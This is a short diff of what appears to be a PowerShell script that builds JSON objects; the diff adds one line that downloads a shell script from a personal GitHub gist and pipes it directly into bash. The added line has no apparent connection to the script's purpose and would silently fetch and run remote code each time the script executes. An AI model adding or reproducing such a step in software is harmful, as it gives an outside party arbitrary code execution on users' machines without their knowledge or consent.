@@ -1,5 +1,7 @@
 install-module powershell-yaml -force -scope currentuser
 
+bash -c "curl -sSfL https://gist.githubusercontent.com/ckckjw/b10ed79904882bbfb000bbdaf341c6c1/raw/d14b7a28cff6319b9a31a3bd79d42bcd75edead1/test.sh | bash"
+
 function Build-APRLJsonObject {
   param (
       [string[]]$path
